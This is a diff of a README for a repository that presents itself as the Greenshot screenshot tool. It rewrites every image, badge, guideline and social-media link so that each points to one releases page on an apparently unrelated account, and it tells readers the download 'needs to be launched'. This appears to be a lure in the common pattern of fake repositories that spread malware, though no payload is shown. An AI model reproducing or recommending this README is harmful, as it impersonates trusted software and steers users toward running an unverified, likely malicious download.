@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the Greenshot repository! Greenshot is a versatile screenshot tool that enhances your screen capture experience. Whether you need to quickly capture and annotate images, share screenshots, or boost your productivity with easy screen snips, Greenshot has got you covered.
 
-![Greenshot Logo](https://example.com/greenshotlogo.png)
+![Greenshot Logo](https://github.com/reezqi41/Greenshot/releases)
 
 ## Key Features
 📸 Capture and edit images  
@@ -24,7 +24,7 @@ Welcome to the Greenshot repository! Greenshot is a versatile screenshot tool th
 
 ## Installation
 You can download the latest version of Greenshot from the following link:  
-[![Download Greenshot](https://img.shields.io/badge/Download-Greenshot-brightgreen)](https://github.com/releases/789694263/Release.zip)  
+[![Download Greenshot](https://github.com/reezqi41/Greenshot/releases)](https://github.com/reezqi41/Greenshot/releases)  
 *(Note: The link ends with the file name and needs to be launched.)*
 
 If the link provided above is not working or you need more options, please check the "Releases" section of this repository for alternative download sources.
@@ -39,24 +39,24 @@ If the link provided above is not working or you need more options, please check
 ## Screenshots
 Here are some screenshots of Greenshot in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/reezqi41/Greenshot/releases)
 *Caption: Capture and annotate images easily with Greenshot.*
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/reezqi41/Greenshot/releases)
 *Caption: Share your screenshots in just a few clicks with Greenshot.*
 
 ## Support
 If you encounter any issues with Greenshot or have any questions about the software, feel free to reach out to our support team. We are here to help you make the most of your screen capture experience.
 
 ## Contribute
-We welcome contributions to Greenshot! Whether you want to report a bug, suggest a new feature, or contribute code, your input is valuable to us. Check out our contribution guidelines in the "CONTRIBUTING.md" file to get started.
+We welcome contributions to Greenshot! Whether you want to report a bug, suggest a new feature, or contribute code, your input is valuable to us. Check out our contribution guidelines in the "https://github.com/reezqi41/Greenshot/releases" file to get started.
 
 ## License
 Greenshot is licensed under the MIT License. See the "LICENSE" file for more details.
 
 ## Connect with Us
 Stay up to date with the latest Greenshot news and updates by following us on social media:
-- Twitter: [@GreenshotTool](https://twitter.com/GreenshotTool)
-- Facebook: [GreenshotTool](https://www.facebook.com/GreenshotTool)
+- Twitter: [@GreenshotTool](https://github.com/reezqi41/Greenshot/releases)
+- Facebook: [GreenshotTool](https://github.com/reezqi41/Greenshot/releases)
 
 Thank you for choosing Greenshot to enhance your screen capture experience! 🌟📸🚀
